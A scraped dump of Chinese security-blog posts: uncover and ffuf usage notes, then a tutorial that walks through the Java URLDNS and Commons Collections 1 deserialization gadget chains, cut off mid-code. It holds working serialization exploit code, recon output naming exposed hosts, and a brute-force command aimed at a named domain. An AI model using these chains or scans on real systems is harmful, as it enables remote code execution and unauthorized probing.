指定输出内容123456789101112131415uncover -q jira -f host -silentec2-44-198-22-253.compute-1.amazonaws.comec2-18-246-31-139.us-west-2.compute.amazonaws.comtasks.devrtb.comleased-line-91-149-128-229.telecom.by74.242.203.213.static.inetbone.netec2-52-211-7-108.eu-west-1.compute.amazonaws.comec2-54-187-161-180.us-west-2.compute.amazonaws.com185-2-52-226.static.nucleus.beec2-34-241-80-255.eu-west-1.compute.amazonaws.com-f 有三种模式：ip、port、host，对应的就是只输出ip、port或者host-silent表示只输出不调试 自定义输出格式12345678echo kubernetes | uncover -f https://ip:port/version -silenthttps://35.222.229.38:443/versionhttps://52.11.181.228:443/versionhttps://35.239.255.1:443/versionhttps://34.71.48.11:443/versionhttps://130.211.54.173:443/versionhttps://54.184.250.232:443/version 将uncover的结果作为其他工具的输入1234uncover -q example -f ip | naabu 在找到的主机上运行 naabu 进行端口扫描uncover -q title:GitLab | httpx 为 Web 服务器运行 httpx 以探测找到的结果。uncover -q 51.83.59.99/24 | httpx 在从 shodan-internetdb 获取的主机/端口上运行 httpx。uncover -q &#x27;org:&quot;Example Inc.&quot;&#x27; | httpx | nuclei 运行 httpx / nuclei 进行漏洞评估。 notes结果被限制为 100 默认值，可以使用 limit 标志来增加。 常用命令快速探测端口以及存活探测1./uncover -q net:192.168.2.1/24 | ./httpx -sc -title 配置shodan key1234shodan: - ZOOMEYE_API_KEY=","categories":[{"name":"工具","slug":"工具","permalink":"http://dale.us.kg/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"工具使用/projectdiscovery","slug":"工具使用-projectdiscovery","permalink":"http://dale.us.kg/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8-projectdiscovery/"}]},{"title":"ffuf的使用","slug":"ffuf的使用","date":"2024-03-23T04:57:29.000Z","updated":"2024-11-09T10:19:18.548Z","comments":true,"path":"2024/03/23/ffuf的使用/","permalink":"http://dale.us.kg/2024/03/23/ffuf%E7%9A%84%E4%BD%BF%E7%94%A8/","excerpt":"","text":"✍内容下载地址https://github.com/ffuf/ffuf/ 直接去release中下载编译好的amd64的 使用教程使用关键字来确定fuzz的位置，默认关键字是FUZZ，可以自己定义，只需要在字典的后面加上冒号+名称即可 帮助ffuf -h 代理-x socks5:&#x2F;&#x2F;127.0.0.1:10810 指定文件头 指定User-Agent-H “User-Agent: Mozilla&#x2F;5.0 Windows NT 10.0 Win64 AppleWebKit&#x2F;537.36 Chrome&#x2F;69.0.3497.100” 递归fuzz 指定递归2层-recursion 2 匹配正则-mr “sucess” 匹配状态码 匹配需要的-mc 200，403 匹配所有-mc all 匹配响应大小-ms 1291 过滤响应文件大小 指定大小为42的过滤掉-fs 42 正则过滤-fr “error” 指定后缀-e jsp,zip 输出 若是没有输出就不创造文件-or 输出指定格式-of md 输出到文件-o result.md 常用命令 爆破POST传入json格式密码 123ffuf -w entries.txt -u https://example.org/ -X POST -H &quot;Content-Type: application/json&quot; \\ -d &#x27;&#123;&quot;name&quot;: &quot;FUZZ&quot;, &quot;anotherkey&quot;: &quot;anothervalue&quot;&#125;&#x27; -fr &quot;error&quot; -H &quot;User-Agent: Mozilla/5.0 Windows NT 10.0 Win64 AppleWebKit/537.36 Chrome/69.0.3497.100&quot; 爆破目录 12ffuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs 42 -c -v -H &quot;User-Agent: Mozilla/5.0 Windows NT 10.0 Win64 AppleWebKit/537.36 Chrome/69.0.3497.100&quot; -x socks5://127.0.0.1:10810 爆破备份文件 12./ffuf -w ./bak.txt:FUZZ1 -u http://www.pxslzx.cn:9000/FUZZ1 -c -v -H &quot;User-Agent: Mozilla/5.0 Windows NT 10.0 Win64 AppleWebKit/537.36 Chrome/69.0.3497.100&quot; -x socks5://127.0.0.1:10810 -fc 302 批量网站扫描敏感目录 1./ffuf -w ./urls.txt:urls -w ./字典.txt:FUZZ1 -u http://urls/FUZZ1 -c -v -H &quot;User-Agent: Mozilla/5.0 Windows NT 10.0 Win64 AppleWebKit/537.36 Chrome/69.0.3497.100&quot; -x socks5://127.0.0.1:10810 爆破findsomething插件找出的单个网站的路径是否存活 12./ffuf.exe -u FUZZ -w &#x27;D:\\Desktop\\工具\\ffuf_2.1.0\\urls.txt&#x27; -c -v -H &quot;User-Agent: Mozilla/5.0 Windows NT 10.0 Win64 AppleWebKit/537.36 Chrome/69.0.3497.100&quot; -fc 302 Linux下的命令扫描多个网站的目录 1ffuf -w /home/dale/Desktop/spyhunt/results/404.txt:urls -w /home/dale/Desktop/dic/web-quickstart:FUZZ1 -u urls/FUZZ1 -c -v -H &quot;User-Agent: Mozilla/5.0 Windows NT 10.0 Win64 AppleWebKit/537.36 Chrome/69.0.3497.100&quot; -x http://127.0.0.1:9090","categories":[{"name":"工具","slug":"工具","permalink":"http://dale.us.kg/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"工具使用/fuzz","slug":"工具使用-fuzz","permalink":"http://dale.us.kg/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8-fuzz/"}]},{"title":"ysoserial的使用方法","slug":"ysoserial的使用方法","date":"2024-03-19T00:34:00.000Z","updated":"2024-11-09T10:19:19.226Z","comments":true,"path":"2024/03/19/ysoserial的使用方法/","permalink":"http://dale.us.kg/2024/03/19/ysoserial%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/","excerpt":"","text":"✍内容项目地址：https://github.com/frohoff/ysoserial 1java -jar .\\ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS https://www.baidu.com &gt; 2.ser","categories":[{"name":"java安全","slug":"java安全","permalink":"http://dale.us.kg/categories/java%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"代码审计/java/笔记/反序列化","slug":"代码审计-java-笔记-反序列化","permalink":"http://dale.us.kg/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-java-%E7%AC%94%E8%AE%B0-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"Java反序列化漏洞入门","slug":"Java反序列化漏洞入门","date":"2023-10-24T00:44:56.000Z","updated":"2024-11-09T10:19:18.685Z","comments":true,"path":"2023/10/24/Java反序列化漏洞入门/","permalink":"http://dale.us.kg/2023/10/24/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8/","excerpt":"","text":"✍内容参考链接java安全基础反序列化02 URLDNS利用链_哔哩哔哩_bilibili 浅显易懂的JAVA反序列化入门 - 先知社区 (aliyun.com) 深入理解 Java 反序列化漏洞-腾讯云开发者社区-腾讯云 (tencent.com) Java反序列化漏洞分析 - ssooking - 博客园 (cnblogs.com) 【两万字原创长文】完全零基础入门Fastjson系列漏洞（基础篇） (qq.com) IDEA常用快捷键F7步入|F8步过|F9到下一个断点|ALT+F8评估表达式|Ctrl+F 文件内查找字符串|双击Shift 查找任何内容，可搜索类、资源、配置项、方法等，还能搜索路径|Ctrl + N 按类名搜索类|Ctrl + F12 查看当前类结构|Ctrl + H 查看类的层次关系|Alt + F7 查找类或方法在哪被使用 反序列化基础参考:序列化和反序列化 URLDNS链分析这是java的原生利用链，通常用于反序列化的验证，因为是原生态不存在版本限制 HashMap结合URL触发的DNS检查思路 利用链123456789HashMap --&gt; readObject()HashMap --&gt; hash()URL --&gt; hashcode()URL --&gt; getByName()进行域名解析的函数 利用分析 首先新建一个DnsTester类，new一个HashMap对象和一个URL对象 123456789101112import java.net.MalformedURLException; import java.net.URL; import java.util.HashMap; public class DnsTester &#123; public static void main(String[] args) throws MalformedURLException &#123; HashMap list = new HashMap&lt;&gt;();//新建HashMap对象 URL host = new URL(&quot;http://yp1vwv.dnslog.cn&quot;); list.put(host,&quot;22&quot;); &#125; &#125; 然后按住ctrl键，左键点击HashMap进入查看 点击查看结构窗口，然后找到readObject方法，找到下面有一个hash方法加密key 转到hash方法 可以看到传入hash方法中的是对象，然后使用对象的hashCode方法来进行加密 这条利用链用到的是URL类的hashCode方法 转到DnsTester类，然后ctrl+左键转到URL类中 找到hashCode方法，可以看到先是判断hashCode的值是不是-1，是的话就直接退出，不是的话就继续执行下面的代码 查看handler类中hashCode方法，ctrl+左键点击handler.hashCode() 这时候传入的是u，也就是我们一开始定义的URL对象 可以看到调用了URL对象的getHostAddress方法 转到getHostAddress方法 发现调用了InetAddress的getByName方法，这个方法的作用是通过DNS解析host的IP地址，利用链到这里就结束了 attention但是我们需要的是需要将HashMap对象给序列化的，这样的话我们在反序列化前就会使用一次DNS解析，而这时候我们的本地就会有DNS记录，这时候我们将序列化的内容反序列化的时候就不会在dnslog平台产生请求记录了 解决方法：其实这个对远程的目标有什么影响，只是会影响本地的复现而已，而且使用新版本的burpsuite的collabrator也没什么影响 解决方式一：刷新本地dns记录 ipconfig /flushdns 解决方法二：使用反射修改hashCode的值 按照思路，只要在put方法之前将URL对象传入之前使用反射的方法将hashCode的值修改成非-1即可，代码实现如下： 12345678910111213141516171819202122232425262728import java.io.*; import java.lang.reflect.Field; import java.net.MalformedURLException; import java.net.URL; import java.util.HashMap; public class DnsTester &#123; public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123; HashMap list = new HashMap&lt;&gt;(); URL host = new URL(&quot;http://fyhgocmxl650362zx0g1cw4t5kbbz1nq.oastify.com&quot;); //添加反射，获取URL类中的HashCode方法 Class c = Class.forName(&quot;java.net.URL&quot;); Field FieldhashCode = c.getDeclaredField(&quot;hashCode&quot;); FieldhashCode.setAccessible(true);// 变量为 private 修改访问权限 FieldhashCode.set(host,1);//这里传入的是具体的URL对象和想要设置的值，只要不是-1就行 list.put(host,&quot;22&quot;);//因为这时候hashCode不是-1，所以这时候就不会发生dns请求了 FieldhashCode.set(host,-1);//将值改过来 //将HashMap对象list序列化写入文件 FileOutputStream fileOutputStream = new FileOutputStream(&quot;./ser.txt&quot;); ObjectOutputStream serial = new ObjectOutputStream(fileOutputStream); serial.writeObject(list); serial.close(); fileOutputStream.close(); &#125; &#125; 重新新建一个java类文件写入反序列化代码，反序列化代码如下： 123456789101112131415import java.io.FileInputStream; import java.io.FileNotFoundException; import java.io.IOException; import java.io.ObjectInputStream; public class DeSerial &#123; public static void main(String[] args) throws IOException, ClassNotFoundException &#123; FileInputStream fileInputStream = new FileInputStream(&quot;./ser.txt&quot;); ObjectInputStream deserial = new ObjectInputStream(fileInputStream); deserial.readObject(); deserial.close(); fileInputStream.close(); &#125; &#125; 先运行序列化的代码，然后运行反序列化代码 如上图运行成功 注意：对于java21来说不允许通过反射修改private，但是java8没问题 解决方法：使用ysoserial中的利用方式 参考：https://paper.seebug.org/1242/#_2https://www.yuque.com/tianxiadamutou/zcfd4v/fewu54#44f36f80 yso在创建URL对象时使用了三个参数的构造方法。这里比较有意思的是，yso用了子类继承父类的方式规避了dns查询的风险，其创建了一个内部类： 12345678910static class SilentURLStreamHandler extends URLStreamHandler &#123; protected URLConnection openConnection(URL u) throws IOException &#123; return null; &#125; protected synchronized InetAddress getHostAddress(URL u) &#123; return null; &#125; &#125; 定义了一个URLConnection和getHostAddress方法，当调用put方法走到getHostAddress方法后，会调用SilentURLStreamHandler的getHostAddress而非URLStreamHandler的getHostAddress，这里直接return null了，所以自然也就不会产生dns查询。 那么为什么在反序列化时又可以产生dns查询了呢？是因为这里的handler属性被设置为transient，前面说了被transient修饰的变量无法被序列化，所以最终反序列化读取出来的transient依旧是其初始值，也就是URLStreamHandler。 总结 总结一下寻找漏洞的流程：1、hashmap类中的反序列化方法readObject方法中调用了hash方法2、hash方法调用了传入的键值key对象的hashcode方法，因为这个对象是Object类型，所以传入有hashcode方法的对象即可3、鼠标停在hashcode方法上，按快捷键ctrl+alt+F7，打开右上角的设置，选择找重写方法，选择查找范围为库，然后按alt+F7进行查找，最后找到java.net.URL中有用到hashcode4、找到hashcode方法是使用的handler对象的hashcode方法，handler对象是URLStreamHandler类的对象5、转到URLStreamHandler类中hashCode方法，发现里面使用了getHostAddress方法6、转到getHostAddress方法，发现方法u.getHostAddress()，u是URL对象，又返回到URL类中的getHostAddress()方法7、转到URL类中的getHostAddress()方法，发现InetAddress.getByName(host)8、上一步getByName方法就是做dns解析 流程图 123456hashmap(readObject)-&gt;hashmap(readObject--&gt;&gt;hash)-&gt;hashmap(hash--&gt;&gt;[obj]hashcode)-&gt;URL(hashcode--&gt;&gt;URLStreamHandler.hashcode)-&gt;URLStreamHandler(hashcode--&gt;&gt;[InetAddress]getHostAddress)-&gt;URLStreamHandler(getHostAddress--&gt;&gt;[URL]u.getHostAddress())-&gt;URL(InetAddress.getByName) POC构造思路目的是让hashmap反序列化的时候将key的对象执行hashcode方法，而且执行的还要是URL类中的方法，所以我们需要传入一个URL类型的键到hashmap对象 123HashMap list = new HashMap&lt;&gt;();//新建HashMap对象URL host = new URL(&quot;http://yp1vwv.dnslog.cn&quot;); list.put(host,&quot;22&quot;); Common Collections利用链分析Apache Commons Collections 是一个扩展了Java标准库里的Collection结构的第三方基础库 123项目地址官网： http://commons.apache.org/proper/commons-collections/ Github: https://github.com/apache/commons-collections java源码环境搭建因为在sun包中的都是class文件不是java源码，在查找某个函数的用法的时候只会在源码中找，所以需要下载sun包中的源码 下载地址：https://hg.openjdk.org/ 根据网上所说的，在jdk8u65以后就修复了AnnotationInvocationHandler类的相关漏洞，所以最好下载jdk8u65以前的源码jdk8u65源码路径：https://hg.openjdk.org/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip 下载对应的版本的JDK，也就是JDK8u65 java8历史版本下载Java 存档下载 — Java SE 8 | Oracle 中国 选择JDK8u65的JDK版本，然后安装配置项目JDK即可 将刚刚下载的jdk8u65源码解压，然后将src\\share\\classes中的sun文件夹复制到jdk8u65安装目录下的src.zip中 然后配置一下IDEA中的项目结构中JDK为8u65即可 然后找到AnnotationInvocationHandler类 出现问题了，可能是源码或者JDK下错了，按照这个思路没有错，但是源码啥的一定要对应，否则就会有这个问题 最后尝试了半天使用了java7u80版本，源码对应位置：https://hg.openjdk.org/jdk7u/jdk7u/jdk/rev/a942e0b52477 Common Collections1 参考:Java反序列化CommonsCollections篇(一) CC1链手写EXP_哔哩哔哩_bilibilihttps://paper.seebug.org/1242/#_3 利用链 第一部分：构造Runtime执行命令，并且解决Runtime序列化问题 public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) public ConstantTransformer(Object constantToReturn) public ChainedTransformer(Transformer[] transformers) 第二部分：扩大利用链 protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) valueTransformer.transform() 第三部分：反序列化利用 AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) readObject()–&gt;&gt;setValue() setValue()–&gt;&gt;回到了TransformedMap的父类AbstractInputCheckedMapDecorator 难点就是父类重写了setvalue方法，这一步回到了父类 然后调用valueTransformer.transform(object); 详细见下面分析 环境搭建因为不是自带的包，所以需要导入包到项目或者模块中才可以使用 这里使用maven导入比较简单哦 直接新建模块，选择maven然后在pom.xml文件中添加版本3.1的commons-collections 1234567&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.1&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 然后右键，选择maven中的下载源代码即可下载java源代码 如此，环境便是已经搭建完毕 利用链分析在commons collections中有一个Transformer接口，其中包含一个transform方法，通过实现此接口来达到类型转换的目的。我们看一下有哪些类实现了这个接口，直接鼠标停留在Transformer接口的transformer方法上，然后按住ctrl+alt+B，就可以看到所有实现了 其中有众多类实现了此接口，cc中主要利用到了以下三个。 InvokerTransformer包路径如下：org.apache.commons.collections.functors.InvokerTransformer 1234567891011121314151617public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); &#125; catch (NoSuchMethodException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;); &#125; catch (IllegalAccessException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;); &#125; catch (InvocationTargetException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, ex); &#125; &#125; 这个类中的方法作用是传入一个类，然后利用反射调取这个里面的方法 其实最主要的漏洞就是这里了，只要我们创建InvokerTransformer对象，然后初始化的时候将我们的exec函数和想要执行的命令传进去，然后利用InvokerTransformer对象的transform方法将我们的Runtime对象传进去，就可以执行任意命令了 POC如下 12345678910111213141516package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.InvokerTransformer; public class CC1Tester &#123; public static void main(String[] args) &#123; Runtime runtime = Runtime.getRuntime(); //这里根据定义的内容传入对应的参数，其实也是反射中调用类中函数的参数 InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc.exe&quot;&#125;); invokerTransformer.transform(runtime); &#125; &#125; 执行结果可以看到成功的弹出了计算机，但是序列化的时候只能序列化一个对象，然后这个对象如果是传入了我们的payload代码，在反序列化的时候如果服务端后面没有用我们传入恶意代码的InvokerTransformer对象的transform方法传入一个Runtime类型的代码，那么还是没有办法执行任意命令 还需要实现的目的如下 找到直接调用InvokerTransformer类的transform方法的对象或者是方法 找到payload 好难⊙﹏⊙∥呜呜呜~~~ ChainedTransformer因为需要寻找调用transform方法的类，所以转到Transformer接口中，鼠标选中transform方法，按住ctrl+alt+B，发现了有一个ChainedTransformer的类中的transformer方法如下 123456public Object transform(Object object) &#123; for (int i = 0; i &lt; iTransformers.length; i++) &#123; object = iTransformers[i].transform(object); &#125; return object; &#125; 其中iTransformers是创建对象时传入的Transformer[]类型的数据 这个函数功能是从传入的Transformer数组中执行每一个的transform方法，并且将前面一个的返回结果传入后面一个对象的transform方法中，然后最后返回最后一个对象的transform函数执行的结果 这里解决了我们的执行InvokerTransformer对象的transform方法的问题 使用这个对象的方法的话，只要服务端有执行ChainedTransformer对象的transform方法的话就会触发rce 1234567891011121314151617package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InvokerTransformer; public class CC1Tester &#123; public static void main(String[] args) &#123; //因为接口不能直接创建对象，所以这里使用的是匿名内部类的写法创建对象 Transformer[] transformers= new Transformer[]&#123;new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc.exe&quot;&#125;)&#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); chainedTransformer.transform(Runtime.getRuntime()); &#125; &#125; 实现效果如下但是这样反序列化后，还是需要服务端执行chainedTransformer.transform(Runtime.getRuntime()); 这几乎是不可能的，所以我们现在要找到一个类既有transform方法，且传入InvokerTransformer对象的transform方法的值是Runtime.getRuntime()对象 ConstantTransformer找到ConstantTransformer对象的transform方法，作用是返回传入的对象 如果采用这个对象的方法的话，那么上面的问题就可以解决一半了 POC代码如下 1234567891011121314import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; public class CC1Tester &#123; public static void main(String[] args) &#123; Transformer[] transformers= new Transformer[]&#123;new ConstantTransformer(Runtime.getRuntime()),new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc.exe&quot;&#125;)&#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); chainedTransformer.transform(111); &#125; &#125; 这里只是利用匿名类的方法将ConstantTransformer对象传入Transformer[]数组中，然后返回的值就是Runtime类型的，然后传入后面的transform方法，也就执行恶意代码了 执行结果 如此，只要我们将ChainedTransformer对象序列化，然后传给服务端，且服务端存在操作ChainedTransformer的transform方法的命令，那么就利用成功了，但是这样利用还是有点难以实现，如果直接反序列化就可以执行恶意代码就完美了 在解决这个问题之前还有一个问题需要解决，就是Runtime不能够被序列化，因为他没有实现Serializable接口 解决Runtime序列化问题这里因为有InvokerTransformer类的存在，所以可以考虑如下方法： 首先，在ChainedTransformer大框架下面，利用ConstantTransformer将Class类的Runtime传入InvokerTransformer的transform方法中，利用其反射的功能调用getMethod方法，获取Runtime的getRuntime方法的Method对象，然后再使用InvokerTransformer的transform方法执行Runtime.getRuntime命令，然后将Runtime对象传给下一个InvokerTransformer的transform方法，然后执行系统命令。 思路： InvokerTransformer1——&gt;获取getRuntime的Method对象InvokerTransformer2——&gt;获取Rumtime对象InvokerTransformer3——&gt;执行Rumtime对象的exec命令 InvokerTransformer在这怎个过程中相当于一个代理，通过这个对象中的transform方法来调用 正常的反射写法： 12345Class cls = Runtime.class; Method getRuntimeMethod = cls.getMethod(&quot;getRuntime&quot;,null); Runtime r =(Runtime) getRuntimeMethod.invoke(null,null); Method execMethod = cls.getMethod(&quot;exec&quot;, String.class); execMethod.invoke(r,&quot;calc.exe&quot;); 使用InvokerTransformer的写法： 12345678910Transformer[] transformers= new Transformer[]&#123;new ConstantTransformer(Runtime.class), //执行下面这条语句得到getRuntime方法的Method对象并且传入下一条语句,getMethod有两个参数，所以这里参数也需要2个 new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;), //执行下面这条语句相当于getRuntimeMethod.invoke(null,null)，也就是会直接执行Runtime.getRuntime()，然后返回Runtime对象给下一条语句 new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;), //执行下面这语句相当于执行execMethod.invoke(r,&quot;calc.exe&quot;) new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;, new Object[]&#123;&quot;calc.exe&quot;&#125;)&#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); chainedTransformer.transform(111); 这里的参数一定要写对，否则是复现不成功的，至此Runtime序列化的事情解决。 解决transform函数执行问题最终我们是要回到readObject方法的，所以我们需要一层层的往上找，直到找到一个函数直接被readObject调用 鼠标停留在transform函数上面，然后查找用法 然后点击设置图标就可以选择作用域 找到TransformedMap类中有多个调用transform方法的函数 分析查看该类 可以看到这个transformKey函数对keyTransformer进行操作，若是不为null的话就调用transform方法 查看keyTransformer是什么 可以看到keyTransformer是一个Transformer类型的成员变量，可以被我们所控制，只要创建对象时就可以传入，然后按照思路编写代码如下 12345Map map = new HashMap&lt;&gt;(); TransformedMap transformedMap = new TransformedMap(map,chain,null); transformedMap.transformKey(111);//chain是上面编写的，可参考上面 但是TransformedMap的构造方法是有protect修饰的，所以不能直接使用，幸好里面有一个public修饰的decorate方法可以直接创建一个新的TransformedMap对象 查看并分析decorate方法 123public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123; return new TransformedMap(map, keyTransformer, valueTransformer); &#125; decorate方法的最后一个参数是valueTransformer，key就写null就行了，这个valueTransformer就传chain tip：用这个方法相当于Map map &#x3D; new TransformedMap(—)，也就是多态的写法 所以代码可以这样编写： 123Map map = new HashMap&lt;&gt;(); Map transformedMap = TransformedMap.decorate(map,null,chain); transformedMap.trasformValue(111); 但是trasformValue方法是protect的，不能调用，只能寻找可以直接使用的调用trasformValue方法的方法 最后找到put方法 查看并且分析put方法 可以看到只要调用put就会调用transformValue方法，于是代码可以这样写： 123456789ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123;new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;), new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;, new Object[]&#123;&quot;calc.exe&quot;&#125;)&#125;); Map map = new HashMap&lt;&gt;(); Map transformedMap = TransformedMap.decorate(map,null,chain); transformedMap.put(null,111); 也就是说，只要服务端将反序列化的对象转换成Map类型，然后执行了put方法就可以执行命令 还是不够啊，需要直接使用readObject反序列化后直接执行命令才行啊 因为Map的put操作比较常见，换个思路，从readObject端思考，现在只需要找到readObject直接调用put方法的类就可以了 没有找到，找到所有的对Map对象进行操作的类，转到Map的用法，找到方法形参 找到了AnnotationInvocationHandler类的构造方法是传一个Map对象的 找到该类的readObject方法，发现有对Map对象进行操作 memberValue就是我们传入的值,readObject方法中有一个操作如下 123456789101112131415for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123; String name = memberValue.getKey(); Class&lt;?&gt; memberType = memberTypes.get(name); if (memberType != null) &#123; // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) &#123; memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember( annotationType.members().get(name))); &#125; &#125; &#125; 但是看上面的操作，发现会对Map对象使用get操作，这时候我们只要找到对get方法操作有调用transform函数的即可，这时候转到tranform用法，发现了LazyMap中有使用get函数调用transform函数 然后发现了LazyMap中也有decorate方法，且该方法和TransformedMap一样的功能，新创建了一个LazyMap对象 如此，利用链便清晰了_ 完整POC如下 123456789101112131415161718ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123;new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;), new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;, new Object[]&#123;&quot;calc.exe&quot;&#125;)&#125;); // chain.transform(111); Map map = new HashMap&lt;&gt;(); map.put(&quot;value&quot;,&quot;key&quot;); Map transformmap = TransformedMap.decorate(map,null,chain); //因为AnnotationInvocationHandler的构造方法和参数不是public。所以需要使用反射来调用 Constructor handler_constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class,Map.class); handler_constructor.setAccessible(true); Object instance = handler_constructor.newInstance(Target.class,transformmap); FileOutputStream fileOutputStream = new FileOutputStream(&quot;D:\\\\Desktop\\\\JavaTester\\\\CC1\\\\src\\\\main\\\\java\\\\org\\\\example\\\\ser.txt&quot;); ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream); outputStream.writeObject(instance); outputStream.close(); fileOutputStream.close(); 执行以上的代码后执行以下反序列化代码 12345FileInputStream fileInputStream = new FileInputStream(&quot;D:\\\\Desktop\\\\JavaTester\\\\CC1\\\\src\\\\main\\\\java\\\\org\\\\example\\\\ser.txt&quot;); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); objectInputStream.close(); fileInputStream.close(); 注意：若是运行出现java源错误，可以修改设置中的java字节版本到相应的版本，然后项目结构中的模块的语言结构也改成相应结构即可 代码解释map.put(“value”,”key”);这里的键一定要是value，值的话随便 因为在AnnotationInvocationHandler中要先判根据键的类型是否是空因为我们传入的是Target注解，可以看到里面只有value 所以需要传入value，然后就会继续往下执行，直到调用setValue，然后又因为transformerMap继承于AbstractInputCheckedMapDecorator接口，然后里面重写了MapEntry类的setValue方法 然后里面又调用了checkSetValue方法，于是就执行transform方法 至此，利用链完成 Lazymap链上面用到TransformedMap是为了解决transform函数调用问题，Lazymap类也可以解决这个问题，而且ysoserial也是用的这个方法，下面就分析一下 首先找到了get方法可以调用transform方法，而factory变量是由我们控制的，就是传创建对象时传入的Map对象 里面有一个decorate方法和TransformedMap类中的decorate方法一样也是帮助我们创建Lazymap对象的，所以按照参数创建即可，如此只要由readObject调用Map的get方法即可实现调用transform方法，即可执行我们的恶意命令 AnnotationInvocationHandler类中的Invoke方法刚好有调用get方法 AnnotationInvocationHandler实现了InvocationHandler，由动态代理的知识可以想到AnnotationInvocationHandler可以建立动态代理 然后发现在readObject中调用了Map对象的entrySet方法由此可以知道，只要AnnotationInvocationHandler建立Map的动态代理，然后将动态代理对象作为Map对象传入新的AnnotationInvocationHandler对象中，等到执行memberValues.entrySet()时就会先去AnnotationInvocationHandler中的involke中执行get方法，然后再回到LazyMap的get，就执行了transform 🎉代码实现如下： 123456789101112131415161718192021222324public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException, InstantiationException &#123; ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123;new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;), new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;, new Object[]&#123;&quot;calc.exe&quot;&#125;)&#125;); Map map = new HashMap&lt;&gt;(); Map lazymap = LazyMap.decorate(map,chain);//使用decorate创建对象 //因为AnnotationInvocationHandler对象的构造方法由protect修饰，所以需要使用反射来创建对象 Constructor constructor1 = 